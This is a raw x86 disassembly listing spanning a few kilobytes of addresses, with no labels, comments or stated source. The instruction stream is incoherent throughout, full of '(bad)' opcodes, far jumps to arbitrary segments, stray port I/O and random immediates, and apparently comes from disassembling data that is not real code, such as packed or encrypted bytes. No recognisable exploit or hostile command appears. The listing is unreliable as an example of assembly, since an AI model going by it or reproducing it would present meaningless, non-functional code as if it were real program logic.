  41f21e:	dec    ecx
  41f21f:	lock test eax,0x5e97b5ec
  41f225:	das    
  41f226:	jp     0x41f1cd
  41f228:	push   eax
  41f229:	adc    ebp,esi
  41f22b:	inc    edi
  41f22c:	ret    0xf56d
  41f22f:	mov    ds:0xe5cd4737,eax
  41f234:	sub    al,0x4
  41f236:	aam    0xda
  41f238:	adc    BYTE PTR [esi-0x70],cl
  41f23b:	imul   edi
  41f23d:	adc    ch,BYTE PTR [ecx+0x1b151305]
  41f243:	int3   
  41f244:	or     DWORD PTR [edi+0x1a],0x7d
  41f248:	or     eax,0xa1fa407a
  41f24d:	jl     0x41f1ee
  41f24f:	div    DWORD PTR [eax-0x5da811c2]
  41f255:	std    
  41f256:	xchg   esi,eax
  41f257:	jnp    0x41f233
  41f259:	stos   DWORD PTR es:[edi],eax
  41f25a:	clc    
  41f25b:	mov    al,ds:0xdab5367a
  41f260:	nop
  41f261:	mov    eax,ds:0xb3ab4296
  41f266:	frstor [ecx]
  41f268:	jo     0x41f20c
  41f26a:	mov    ebp,DWORD PTR [ebx]
  41f26c:	call   0xe55fc670
  41f271:	jecxz  0x41f2ba
  41f273:	push   0xbfcd4a0e
  41f278:	loopne 0x41f2a7
  41f27a:	sahf   
  41f27b:	clc    
  41f27c:	fldcw  WORD PTR gs:[eax+ebp*8+0x64219a48]
  41f284:	and    DWORD PTR fs:[edx],ebp
  41f287:	lock jns 0x41f2f3
  41f28a:	sub    ebp,DWORD PTR [esp+eax*4+0x3]
  41f28e:	mov    WORD PTR [ebx-0x72],ds
  41f291:	inc    ebx
  41f292:	out    0x4b,al
  41f294:	call   0xe85236af
  41f299:	jbe    0x41f2f3
  41f29b:	mov    ds:0x9d558d70,eax
  41f2a0:	pop    esp
  41f2a1:	dec    edi
  41f2a2:	pop    edi
  41f2a3:	mov    ds:0x66ef315,eax
  41f2a8:	js     0x41f2ea
  41f2aa:	dec    edx
  41f2ab:	xor    eax,DWORD PTR [edi+0x6df4ce20]
  41f2b1:	mov    eax,0x257217af
  41f2b6:	pop    ss
  41f2b7:	sar    BYTE PTR [ecx+0x249b29e8],cl
  41f2bd:	add    DWORD PTR [ecx],eax
  41f2bf:	add    ah,BYTE PTR [eax]
  41f2c1:	pop    eax
  41f2c2:	push   esp
  41f2c3:	test   DWORD PTR [esi-0x55],edi
  41f2c6:	gs mov esi,0x879a6d53
  41f2cc:	or     al,0x7e
  41f2ce:	mov    ch,0x5c
  41f2d0:	nop
  41f2d1:	enter  0x3be3,0x1d
  41f2d5:	mov    cl,0x14
  41f2d7:	adc    al,0x9f
  41f2d9:	ds inc esp
  41f2db:	mov    eax,0x8b434d73
  41f2e0:	test   al,0x2
  41f2e2:	inc    edi
  41f2e3:	imul   edx,ecx,0x8c746146
  41f2e9:	shl    eax,0x33
  41f2ec:	mov    ebx,0xe39778d0
  41f2f1:	dec    ebp
  41f2f2:	mov    dh,0x0
  41f2f4:	outs   dx,BYTE PTR ds:[esi]
  41f2f5:	or     ecx,DWORD PTR [esi]
  41f2f7:	cli    
  41f2f8:	inc    eax
  41f2f9:	jbe    0x41f379
  41f2fb:	push   es
  41f2fc:	mul    BYTE PTR [edi]
  41f2fe:	(bad)  
  41f2ff:	cmc    
  41f300:	mov    cl,0x5b
  41f302:	rol    ch,1
  41f304:	xor    al,0xe8
  41f306:	xor    eax,0x2a2320d9
  41f30b:	fistp  WORD PTR [ecx-0x57a8acc1]
  41f311:	sub    eax,0x64c4c1d7
  41f316:	xchg   BYTE PTR [ecx+edx*8-0x5b],dl
  41f31a:	pop    es
  41f31b:	and    ebx,DWORD PTR [ebp+0x2]
  41f31e:	mov    ds:0x31bd18a0,al
  41f323:	sahf   
  41f324:	push   esi
  41f325:	push   0x115b7135
  41f32a:	sahf   
  41f32b:	bound  ebp,QWORD PTR ds:0x759bbc47
  41f331:	add    BYTE PTR [edi+0x7],dh
  41f334:	out    dx,eax
  41f335:	mov    eax,0xca770be2
  41f33a:	cmp    al,0x44
  41f33c:	or     eax,0xf7b69d22
  41f341:	pop    es
  41f342:	adc    bh,BYTE PTR [ebx]
  41f344:	retf   0x8107
  41f347:	test   BYTE PTR [esi],dl
  41f349:	rcl    BYTE PTR [edx-0x467dabd2],0x10
  41f350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f351:	jo     0x41f2e9
  41f353:	push   edi
  41f354:	cmp    al,0x5d
  41f356:	dec    esp
  41f357:	not    DWORD PTR [ecx]
  41f359:	mov    BYTE PTR [ecx+0x8],bh
  41f35c:	pop    es
  41f35d:	mov    ecx,0x509e12d0
  41f362:	scas   eax,DWORD PTR es:[edi]
  41f363:	ins    DWORD PTR es:[edi],dx
  41f364:	pop    ss
  41f365:	or     al,0xa1
  41f367:	aaa    
  41f368:	xor    BYTE PTR [edx+0x129c9560],ah
  41f36e:	push   0xa8c01930
  41f373:	cmp    DWORD PTR [ecx+0x5f],esp
  41f376:	in     al,dx
  41f377:	leave  
  41f378:	js     0x41f338
  41f37a:	or     DWORD PTR [ebx-0x67],ecx
  41f37d:	dec    eax
  41f37e:	and    eax,0xd76c91e8
  41f383:	dec    edx
  41f384:	mov    ds:0xe7e4b08a,eax
  41f389:	into   
  41f38a:	dec    ebx
  41f38b:	icebp  
  41f38c:	nop
  41f38d:	ret    
  41f38e:	inc    edx
  41f38f:	inc    eax
  41f390:	and    eax,0xe4816b3
  41f395:	xor    esi,DWORD PTR [ebx]
  41f397:	dec    ebx
  41f398:	xchg   edx,eax
  41f399:	and    bh,bh
  41f39b:	inc    edx
  41f39c:	jmp    0x41f363
  41f39e:	ins    BYTE PTR es:[edi],dx
  41f39f:	xor    ch,0x68
  41f3a2:	popa   
  41f3a3:	push   ds
  41f3a4:	sbb    bh,BYTE PTR [edx-0x2b]
  41f3a7:	cmc    
  41f3a8:	inc    ecx
  41f3a9:	cmp    ch,0x67
  41f3ac:	jl     0x41f381
  41f3ae:	icebp  
  41f3af:	and    DWORD PTR [eax+0x737d651c],ebx
  41f3b5:	push   ebp
  41f3b6:	xchg   esp,eax
  41f3b7:	dec    eax
  41f3b8:	xor    bl,BYTE PTR [ecx-0x6c717a1a]
  41f3be:	in     eax,0xf4
  41f3c0:	dec    edi
  41f3c1:	mov    edi,0x1639e446
  41f3c6:	into   
  41f3c7:	jge    0x41f43b
  41f3c9:	cld    
  41f3ca:	scas   eax,DWORD PTR es:[edi]
  41f3cb:	cmp    BYTE PTR [ebx+edx*4+0x40],dh
  41f3cf:	int3   
  41f3d0:	(bad)  
  41f3d1:	lock xchg DWORD PTR [eax-0x30],eax
  41f3d5:	imul   ecx,DWORD PTR [ecx],0xde18a1b5
  41f3db:	dec    ebx
  41f3dc:	push   edi
  41f3dd:	inc    esi
  41f3de:	aaa    
  41f3df:	mov    BYTE PTR [esi+esi*8-0x21],dh
  41f3e3:	pop    ds
  41f3e4:	dec    edi
  41f3e5:	ror    DWORD PTR [eax],0x6
  41f3e8:	fwait
  41f3e9:	or     ebp,DWORD PTR [ecx+0x4c3ecbae]
  41f3ef:	mov    ebx,0xd96aeacf
  41f3f4:	mov    ds:0xa9ea49c,al
  41f3f9:	aad    0x1d
  41f3fb:	stos   BYTE PTR es:[edi],al
  41f3fc:	jmp    0xfc3b22fa
  41f401:	push   ecx
  41f402:	aad    0x6c
  41f404:	(bad)  
  41f405:	pop    ebp
  41f406:	test   DWORD PTR [ecx-0x55],0xa8610563
  41f40d:	shr    BYTE PTR [eax+edx*1+0x1fbfcd35],cl
  41f414:	outs   dx,DWORD PTR ds:[esi]
  41f415:	cwde   
  41f416:	jb     0x41f441
  41f418:	xchg   ebx,eax
  41f419:	sbb    ah,ch
  41f41b:	inc    esp
  41f41c:	std    
  41f41d:	adc    eax,0xd579642f
  41f422:	inc    ebp
  41f423:	cmp    al,0x83
  41f425:	jmp    0xdfd0:0xf61eb007
  41f42c:	pop    ss
  41f42d:	cs (bad) 
  41f430:	jle    0x41f49f
  41f432:	mov    ebp,0x267817c6
  41f437:	xlat   BYTE PTR ds:[ebx]
  41f438:	inc    eax
  41f439:	and    ch,BYTE PTR [esi+0x42]
  41f43c:	mov    ds:0x366a57b3,eax
  41f441:	fcomp  QWORD PTR [edi]
  41f443:	xor    DWORD PTR [edi+0x58d4e3],edi
  41f449:	add    BYTE PTR [edx+0x4d],dl
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	mov    bl,0x5e
  41f458:	pop    ss
  41f459:	push   ebx
  41f45a:	(bad)  
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	xchg   BYTE PTR [esi],al
  41f460:	add    BYTE PTR [eax],al
  41f462:	adc    eax,0xb09e0937
  41f467:	out    0x63,al
  41f469:	push   edi
  41f46a:	xor    esi,ebp
  41f46c:	mov    WORD PTR [ebp-0x53],gs
  41f46f:	and    DWORD PTR [ebx-0x17],esp
  41f472:	dec    esi
  41f473:	repz push es
  41f475:	int    0xef
  41f477:	jp     0x41f493
  41f479:	out    0x9d,eax
  41f47b:	repz imul ecx,DWORD PTR [edx-0x14],0x731d0ae
  41f483:	popf   
  41f484:	ja     0x41f4a4
  41f486:	pop    es
  41f487:	mov    dh,0xd8
  41f489:	sbb    BYTE PTR [ebp+0x217bc241],bl
  41f48f:	lods   eax,DWORD PTR ds:[esi]
  41f490:	in     eax,0x2d
  41f492:	cmp    al,0xf0
  41f494:	or     al,0xa4
  41f496:	jo     0x41f467
  41f498:	xor    ebp,DWORD PTR [edi]
  41f49a:	or     BYTE PTR [eax+0x7f1af0cd],al
  41f4a0:	add    DWORD PTR [esi+esi*8+0x38],esp
  41f4a4:	push   edi
  41f4a5:	jmp    0xbd2f:0x4449944a
  41f4ac:	enter  0xaf50,0x1d
  41f4b0:	adc    eax,0xd22bfe57
  41f4b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4b6:	mov    cs,WORD PTR [eax]
  41f4b8:	outs   dx,DWORD PTR ds:[esi]
  41f4b9:	pop    esi
  41f4ba:	fcmovu st,st(0)
  41f4bc:	test   BYTE PTR [ebx+eiz*1+0x55],dl
  41f4c0:	jo     0x41f4f5
  41f4c2:	add    cl,BYTE PTR [edi+eax*2+0xd]
  41f4c6:	xchg   si,ax
  41f4c8:	mov    dl,0xfa
  41f4ca:	rol    BYTE PTR [edx+0x4f9f451b],1
  41f4d0:	push   esi
  41f4d1:	jno    0x41f45a
  41f4d3:	add    al,0xc9
  41f4d5:	inc    ecx
  41f4d6:	mov    cl,0x11
  41f4d8:	lds    esp,FWORD PTR [ecx]
  41f4da:	repz mov ds:0xacd276cf,al
  41f4e0:	je     0x41f539
  41f4e2:	scas   eax,DWORD PTR es:[edi]
  41f4e3:	test   cl,dl
  41f4e5:	cmp    ah,al
  41f4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4e8:	jg     0x41f46d
  41f4ea:	leave  
  41f4eb:	cld    
  41f4ec:	scas   al,BYTE PTR es:[edi]
  41f4ed:	jb     0x41f4c0
  41f4ef:	pop    esp
  41f4f0:	mov    esi,0x79779229
  41f4f5:	unpckhps xmm4,XMMWORD PTR [edi+0x1531489]
  41f4fc:	xchg   DWORD PTR [ecx+0x55],eax
  41f4ff:	ret    
  41f500:	out    dx,al
  41f501:	mov    esp,0xdea8a74
  41f506:	push   esp
  41f507:	(bad)  [ebx+0x3f]
  41f50a:	addr16 xor dl,ah
  41f50d:	(bad)  
  41f50e:	cmc    
  41f50f:	xchg   BYTE PTR [eax+ebx*8+0x5e7200bf],ah
  41f516:	loopne 0x41f53c
  41f518:	sub    al,0x23
  41f51a:	mov    al,0x76
  41f51c:	jecxz  0x41f4e8
  41f51e:	inc    eax
  41f51f:	nop
  41f520:	(bad)  
  41f521:	mov    al,ds:0xbbaf6f45
  41f526:	inc    esi
  41f527:	in     eax,dx
  41f528:	js     0x41f596
  41f52a:	sbb    BYTE PTR [eax+edx*4-0x1a],dl
  41f52e:	retf   
  41f52f:	jp     0x41f4f7
  41f531:	int    0x87
  41f533:	push   esp
  41f534:	outs   dx,BYTE PTR ds:[esi]
  41f535:	iret   
  41f536:	dec    ebp
  41f537:	fcomp  QWORD PTR [edi+esi*4-0x22ca43c7]
  41f53e:	aam    0x3b
  41f540:	out    dx,al
  41f541:	jo     0x41f596
  41f543:	es inc ebp
  41f545:	xchg   ecx,eax
  41f546:	je     0x41f56a
  41f548:	pop    edx
  41f549:	in     al,dx
  41f54a:	fnstenv [ebx*4-0x34bffcec]
  41f551:	lds    esp,FWORD PTR [edi]
  41f553:	es repnz dec esp
  41f556:	inc    esp
  41f557:	and    bl,BYTE PTR [ebx]
  41f559:	(bad)  
  41f55a:	jns    0x41f575
  41f55c:	inc    esi
  41f55d:	iret   
  41f55e:	js     0x41f5c8
  41f560:	es jbe 0x41f5ad
  41f563:	push   eax
  41f564:	or     BYTE PTR [edi+0x6f],dl
  41f567:	sbb    eax,0xfafec817
  41f56c:	xlat   BYTE PTR ds:[ebx]
  41f56d:	fdivr  st(3),st
  41f56f:	push   eax
  41f570:	push   ss
  41f571:	add    ah,bl
  41f573:	call   0x8968:0xbc881278
  41f57a:	sti    
  41f57b:	jg     0x41f5b9
  41f57d:	fist   DWORD PTR [esi-0x68]
  41f580:	cmp    esp,ebp
  41f582:	jp     0x41f55b
  41f584:	sbb    al,0x6
  41f586:	out    0xa3,al
  41f588:	jmp    0x41f5d1
  41f58a:	jne    0x41f514
  41f58c:	cdq    
  41f58d:	push   0x5b
  41f58f:	test   cl,dh
  41f591:	lds    esp,FWORD PTR [edx+0x4e30816b]
  41f597:	pop    es
  41f598:	neg    DWORD PTR [edx+0x2feab4f9]
  41f59e:	ins    DWORD PTR es:[edi],dx
  41f59f:	fstp   st(3)
  41f5a1:	push   esi
  41f5a2:	clc    
  41f5a3:	pushf  
  41f5a4:	fwait
  41f5a5:	retf   0xea69
  41f5a8:	push   ebp
  41f5a9:	rol    BYTE PTR [ebx+0x27],cl
  41f5ac:	cmp    al,0x77
  41f5ae:	mov    esp,0xe6baaf4d
  41f5b3:	jmp    0x6327:0x6e446ad2
  41f5ba:	call   0xb23c:0x9f8890f7
  41f5c1:	sbb    BYTE PTR [edx+eax*2],dl
  41f5c4:	add    eax,DWORD PTR [ecx+0x6]
  41f5c7:	adc    eax,0xeadaff42
  41f5cc:	daa    
  41f5cd:	mov    gs,ecx
  41f5cf:	mov    DWORD PTR [eax-0x69],eax
  41f5d2:	jle    0x41f613
  41f5d4:	add    al,0xaf
  41f5d6:	pop    ds
  41f5d7:	inc    edi
  41f5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5d9:	mov    bh,0x90
  41f5db:	jo     0x41f620
  41f5dd:	imul   edx,esp,0x60
  41f5e0:	inc    edx
  41f5e1:	sbb    bh,dl
  41f5e3:	retf   0x8edf
  41f5e6:	mov    edi,0x4f00c4c7
  41f5eb:	pop    ds
  41f5ec:	mov    al,0x6
  41f5ee:	loopne 0x41f5e1
  41f5f0:	jg     0x41f599
  41f5f2:	lock out dx,eax
  41f5f4:	sub    al,0x5d
  41f5f6:	mov    ebp,0xf9266fd4
  41f5fb:	push   edx
  41f5fc:	pop    es
  41f5fd:	cwde   
  41f5fe:	push   es
  41f5ff:	xlat   BYTE PTR ds:[ebx]
  41f600:	inc    ebx
  41f601:	je     0x41f5d6
  41f603:	xor    eax,0x5c0c01b7
  41f608:	retf   0x73f1
  41f60b:	pcmpgtb mm5,QWORD PTR [eax+0x69448315]
  41f612:	mov    eax,0x8c651ded
  41f617:	nop    DWORD PTR [edi+0x1b]
  41f61b:	adc    al,0x7f
  41f61d:	addr16 push es
  41f61f:	addr16 sub dh,BYTE PTR [si-0x10]
  41f624:	xchg   ecx,eax
  41f625:	jle    0x41f60d
  41f627:	in     eax,0x68
  41f629:	dec    ebp
  41f62a:	outs   dx,BYTE PTR ds:[esi]
  41f62b:	mov    al,ds:0xa18bfb9f
  41f630:	mov    ss,WORD PTR [ebx]
  41f632:	cmp    eax,0x387ca056
  41f637:	jno    0x41f66a
  41f639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f63a:	sub    BYTE PTR [esi],al
  41f63c:	shl    ah,0x38
  41f63f:	dec    eax
  41f640:	leave  
  41f641:	push   cs
  41f642:	cmp    al,cl
  41f644:	sbb    BYTE PTR [esi-0x23],0x1c
  41f648:	setb   BYTE PTR [ecx]
  41f64b:	inc    ecx
  41f64c:	fldcw  WORD PTR [ebp+ecx*8+0xa1b37ac]
  41f653:	push   esp
  41f654:	sbb    al,0x4f
  41f656:	adc    DWORD PTR [ebp-0x6f],ecx
  41f659:	ins    BYTE PTR es:[edi],dx
  41f65a:	pushf  
  41f65b:	mov    DWORD PTR [edx-0x2f5373b0],esi
  41f661:	ror    DWORD PTR [ecx-0x5c],1
  41f664:	add    esi,DWORD PTR [ebp+0x33]
  41f667:	in     al,dx
  41f668:	adc    bh,BYTE PTR [ebx]
  41f66a:	jmp    FWORD PTR [edi+eiz*2-0x18b9c52d]
  41f671:	hlt    
  41f672:	mov    ds,WORD PTR ds:0x8471af08
  41f678:	mov    esi,0x5a5032e5
  41f67d:	push   eax
  41f67e:	loopne 0x41f64a
  41f680:	das    
  41f681:	icebp  
  41f682:	bound  ebp,QWORD PTR [ebx]
  41f684:	xor    BYTE PTR [eax+eiz*2-0xd914b32],dh
  41f68b:	or     ah,al
  41f68d:	stos   BYTE PTR es:[edi],al
  41f68e:	cmp    edx,DWORD PTR [ecx+0x5474045]
  41f694:	icebp  
  41f695:	cmc    
  41f696:	and    al,0xac
  41f698:	push   esp
  41f699:	inc    esi
  41f69a:	xor    ch,BYTE PTR [ecx+edi*8+0x6d]
  41f69e:	retf   0xeb04
  41f6a1:	push   ecx
  41f6a2:	dec    edi
  41f6a3:	dec    esp
  41f6a4:	push   ss
  41f6a5:	cmp    al,0x6f
  41f6a7:	call   0x8f7b:0x2ef38c97
  41f6ae:	rol    DWORD PTR [ebp-0x1b804c1f],0xd3
  41f6b5:	push   esp
  41f6b6:	sbb    DWORD PTR [eax],0xffffff86
  41f6b9:	jnp    0x41f664
  41f6bb:	out    0xf5,eax
  41f6bd:	mov    ds:0x3dfcfedb,eax
  41f6c2:	clc    
  41f6c3:	dec    esi
  41f6c4:	in     eax,0xb
  41f6c6:	(bad)  
  41f6c7:	mov    eax,0x749157d
  41f6cc:	lock call 0x1ebc:0xe472f1c6
  41f6d4:	shl    ebx,cl
  41f6d6:	xor    DWORD PTR [ebx+0x78],edi
  41f6d9:	fldenv ds:0x7a15503a
  41f6df:	add    ecx,DWORD PTR [edx-0x5e]
  41f6e2:	and    al,0xdd
  41f6e4:	sbb    bl,BYTE PTR [esi]
  41f6e6:	popa   
  41f6e7:	outs   dx,DWORD PTR ds:[esi]
  41f6e8:	mov    al,ds:0xe549d6d2
  41f6ed:	inc    edx
  41f6ee:	jno    0x41f761
  41f6f0:	sub    cl,ch
  41f6f2:	and    ebp,DWORD PTR [edi+0x20]
  41f6f5:	psubd  mm2,QWORD PTR [ebp-0x5c]
  41f6f9:	inc    eax
  41f6fa:	mov    edi,0x5e278f5c
  41f6ff:	ss inc ebx
  41f701:	push   ss
  41f702:	mov    cl,BYTE PTR [ebx-0x31dbd339]
  41f708:	mov    eax,ds:0xfb7fa248
  41f70d:	test   eax,0x5ac3545c
  41f712:	les    ebp,FWORD PTR [ebx+0x5d]
  41f715:	xchg   BYTE PTR [ecx-0x1473b124],al
  41f71b:	adc    ecx,ebx
  41f71d:	pop    ds
  41f71e:	sar    BYTE PTR [edi],1
  41f720:	inc    BYTE PTR [ebp-0x49f48fde]
  41f726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f727:	js     0x41f740
  41f729:	jecxz  0x41f72d
  41f72b:	mov    WORD PTR [ecx+0x33bf478d],fs
  41f731:	mov    BYTE PTR [eax+0x43],ah
  41f734:	cmp    al,BYTE PTR [edx-0x31]
  41f737:	push   ebx
  41f738:	lock cmc 
  41f73a:	out    0xf4,al
  41f73c:	bound  esi,QWORD PTR [esi-0x61]
  41f73f:	loopne 0x41f706
  41f741:	xchg   ah,al
  41f743:	pop    ss
  41f744:	lea    ebp,[ecx+0x63a17911]
  41f74a:	into   
  41f74b:	lods   eax,DWORD PTR ds:[esi]
  41f74c:	clc    
  41f74d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f74e:	outs   dx,DWORD PTR ds:[esi]
  41f74f:	jmp    FWORD PTR [ebp-0x23d68a17]
  41f755:	cmc    
  41f756:	adc    esi,edi
  41f758:	(bad)  
  41f75a:	pop    ebx
  41f75b:	stc    
  41f75c:	xchg   DWORD PTR [esi+edi*4+0x500690a8],edi
  41f763:	sub    DWORD PTR [edi],esi
  41f765:	xor    DWORD PTR [esi-0x2ced2259],eax
  41f76b:	dec    ebx
  41f76c:	dec    esi
  41f76d:	jmp    0xd79d76c8
  41f772:	outs   dx,BYTE PTR ds:[esi]
  41f773:	fidiv  WORD PTR [ebp-0x64]
  41f776:	fst    QWORD PTR [eax]
  41f778:	push   0xad28d17a
  41f77d:	dec    esi
  41f77e:	or     BYTE PTR [edi+0x71f63056],ch
  41f784:	ins    DWORD PTR es:[edi],dx
  41f785:	or     eax,0x4e8d9264
  41f78a:	pop    edi
  41f78b:	hlt    
  41f78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f78d:	aaa    
  41f78e:	fstp   TBYTE PTR [edx-0x7b3c8ed6]
  41f794:	sti    
  41f795:	repz mov ch,0xd5
  41f798:	xchg   ebx,eax
  41f799:	fs dec ecx
  41f79b:	and    esp,DWORD PTR [eax+0x8]
  41f79e:	outs   dx,DWORD PTR ds:[esi]
  41f79f:	sbb    esi,DWORD PTR [edx+0x6e1c0e5a]
  41f7a5:	xchg   esp,eax
  41f7a6:	popf   
  41f7a7:	xor    al,0x90
  41f7a9:	outs   dx,DWORD PTR ds:[esi]
  41f7aa:	fwait
  41f7ab:	xor    eax,0x6e0ea733
  41f7b0:	sti    
  41f7b1:	add    bh,BYTE PTR [ecx+0x7e0e7a1e]
  41f7b7:	test   al,0xc3
  41f7b9:	adc    ecx,DWORD PTR [ebp-0x4b08acd3]
  41f7bf:	arpl   WORD PTR [edi+eiz*2+0x6e51d4bf],di
  41f7c6:	ror    BYTE PTR [edx+0x3f41f0c4],cl
  41f7cc:	ret    0x202e
  41f7cf:	pop    edi
  41f7d0:	add    DWORD PTR [ebx-0x2c7becc9],esp
  41f7d6:	and    eax,0x79505482
  41f7db:	xor    dh,0x84
  41f7de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7df:	in     al,dx
  41f7e0:	sub    BYTE PTR [ecx],0x97
  41f7e3:	jnp    0x41f80e
  41f7e5:	sahf   
  41f7e6:	dec    esi
  41f7e7:	fcomi  st,st(0)
  41f7e9:	add    al,BYTE PTR [ebp+ebx*2-0x49fbb6e]
  41f7f0:	sahf   
  41f7f1:	shr    BYTE PTR [edi+0x72],1
  41f7f4:	js     0xca3e6f96
  41f7fa:	out    0xf,eax
  41f7fc:	shl    DWORD PTR [ebp+eiz*8+0x240b7489],1
  41f803:	push   es
  41f804:	rol    BYTE PTR [edi-0x71],0xa2
  41f808:	inc    ebp
  41f809:	pop    DWORD PTR [ebx-0x42]
  41f80c:	mov    eax,0x20db49c8
  41f811:	pop    eax
  41f812:	in     al,0x48
  41f814:	pop    ebp
  41f815:	push   ebp
  41f816:	mov    ah,0x48
  41f818:	adc    edx,DWORD PTR [eax+0x4]
  41f81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f81c:	sub    ecx,DWORD PTR [edx]
  41f81e:	cmp    DWORD PTR [di],0xe0f13d50
  41f825:	pop    ebx
  41f826:	js     0x41f85b
  41f828:	and    al,0x44
  41f82a:	js     0x41f891
  41f82c:	mov    ebx,0x9c615569
  41f831:	cmp    dh,BYTE PTR [ebp-0xef3f02b]
  41f837:	in     al,0xe3
  41f839:	push   eax
  41f83a:	fucom  st(3)
  41f83c:	outs   dx,DWORD PTR ds:[esi]
  41f83d:	mov    BYTE PTR [eax+ecx*8],bh
  41f840:	or     eax,0xa62744b7
  41f845:	sbb    DWORD PTR [di+0x4143],0xe1c46950
  41f84e:	pop    edi
  41f84f:	jle    0x41f8ab
  41f851:	(bad)  
  41f852:	mov    eax,0xa5452f70
  41f857:	call   0x47ec:0x75060fe3
  41f85e:	adc    al,0xf2
  41f860:	mov    DWORD PTR cs:[ebp+0x3d6d386f],ebp
  41f867:	adc    DWORD PTR [esp+ebp*8+0x6ae5274e],ebx
  41f86e:	xchg   cl,dh
  41f870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f871:	out    0x7a,al
  41f873:	mov    ah,BYTE PTR es:[eax*4+0x26c2ae12]
  41f87b:	mov    ah,0xcb
  41f87d:	pop    eax
  41f87e:	push   ecx
  41f87f:	add    eax,0x75964115
  41f884:	adc    bl,0x6a
  41f887:	xchg   edi,eax
  41f888:	in     eax,0x34
  41f88a:	ret    0x647d
  41f88d:	cmp    dl,al
  41f88f:	outs   dx,DWORD PTR ds:[esi]
  41f890:	out    0xb1,eax
  41f892:	fdivr  st,st(6)
  41f894:	sahf   
  41f895:	cwde   
  41f896:	sub    BYTE PTR [edx+0x41],ah
  41f899:	stos   DWORD PTR es:[edi],eax
  41f89a:	sub    ecx,DWORD PTR [esi+0x369d3984]
  41f8a0:	ficom  WORD PTR [edi-0xe]
  41f8a3:	scas   eax,DWORD PTR es:[edi]
  41f8a4:	cmp    dl,bl
  41f8a6:	jns    0x41f90a
  41f8a8:	pop    ss
  41f8a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8aa:	jno    0x41f8b2
  41f8ac:	test   al,0xd5
  41f8ae:	sti    
  41f8af:	xchg   ecx,eax
  41f8b0:	add    ah,BYTE PTR [ecx+ebx*2-0x6b]
  41f8b4:	xchg   edi,eax
  41f8b5:	ret    0xf2a9
  41f8b8:	aam    0xa7
  41f8ba:	loop   0x41f87d
  41f8bc:	fstp   QWORD PTR [edx]
  41f8be:	lea    esi,[ecx-0x704a65b0]
  41f8c4:	mov    esi,0x3b71d0e6
  41f8c9:	mov    ch,0x19
  41f8cb:	(bad)  
  41f8cc:	bound  ebx,QWORD PTR [eax]
  41f8ce:	call   0x85fc074c
  41f8d3:	cmp    DWORD PTR [edi+0x2],eax
  41f8d6:	mov    al,ds:0x555986e9
  41f8db:	cmp    eax,0x7e6fa3f2
  41f8e0:	repnz push edx
  41f8e2:	mov    esi,0x844ceecd
  41f8e7:	push   ecx
  41f8e8:	mov    BYTE PTR [ecx-0x18],ah
  41f8eb:	sar    BYTE PTR [edi+0x442a7de5],1
  41f8f1:	pusha  
  41f8f2:	pop    eax
  41f8f3:	cmp    BYTE PTR [edx+esi*4+0x4cfae18d],0x31
  41f8fb:	xchg   ecx,eax
  41f8fc:	jbe    0x41f92a
  41f8fe:	adc    BYTE PTR [edx],al
  41f900:	sar    DWORD PTR [edi+eiz*8-0x25],cl
  41f904:	popf   
  41f905:	ret    0xbf29
  41f908:	xor    dl,BYTE PTR ds:0xdf66ee53
  41f90e:	hlt    
  41f90f:	xor    eax,0xdde16891
  41f914:	not    BYTE PTR [ebx-0x4f4c5fd1]
  41f91a:	aas    
  41f91b:	mov    bh,0x63
  41f91d:	push   ecx
  41f91e:	dec    eax
  41f91f:	mov    ebx,0x644ec9
  41f924:	outs   dx,BYTE PTR ds:[esi]
  41f925:	pushf  
  41f926:	push   es
  41f927:	loop   0x41f948
  41f929:	stc    
  41f92a:	push   ss
  41f92b:	mov    al,0x3
  41f92d:	inc    ebp
  41f92e:	jnp    0x41f8b4
  41f930:	add    DWORD PTR [ebp-0x5e],ebx
  41f933:	and    al,0x23
  41f935:	and    edx,DWORD PTR [esi-0x62]
  41f938:	adc    eax,DWORD PTR [esi-0x17]
  41f93b:	out    0xcd,al
  41f93d:	daa    
  41f93e:	addr16 mov dl,0x5d
  41f941:	or     ebx,ebx
  41f943:	dec    ebx
  41f944:	dec    edx
  41f945:	pop    es
  41f946:	fmul   st,st(6)
  41f948:	dec    ecx
  41f949:	jecxz  0x41f8ea
  41f94b:	lds    esp,FWORD PTR [ecx]
  41f94d:	push   esp
  41f94e:	jns    0x41f8e9
  41f950:	or     DWORD PTR [esi-0x6e9515b1],ebx
  41f956:	pushf  
  41f957:	(bad)  
  41f958:	sbb    eax,0x71f5650a
  41f95d:	imul   eax,DWORD PTR [eax],0xba8647fc
  41f963:	test   al,0x6a
  41f965:	gs mov edi,0x59797666
  41f96b:	les    ecx,FWORD PTR [edi-0x11]
  41f96e:	mov    WORD PTR [ebp-0x68],gs
  41f971:	std    
  41f972:	(bad)  
  41f974:	dec    ebp
  41f975:	shl    BYTE PTR [ebp+0x787d9e11],1
  41f97b:	aad    0xfc
  41f97d:	imul   ebp,DWORD PTR [ebx-0x6a22c590],0xffffffd7
  41f984:	mov    esp,0x3c3ea9d3
  41f989:	ret    0x67a7
  41f98c:	sub    BYTE PTR [ecx+0x15e4cbd9],0xa1
  41f993:	aas    
  41f994:	xor    BYTE PTR [esi-0x1ee60e5c],bl
  41f99a:	sahf   
  41f99b:	cmp    cl,BYTE PTR [eax-0xf]
  41f99e:	shl    edx,0xf4
  41f9a1:	ja     0x41f99b
  41f9a3:	pop    ss
  41f9a4:	cmp    bl,BYTE PTR [edi-0x6937aa85]
  41f9aa:	cmp    DWORD PTR [ebx],0xffffffc2
  41f9ad:	test   BYTE PTR [ecx-0x4],0x6c
  41f9b1:	inc    ebx
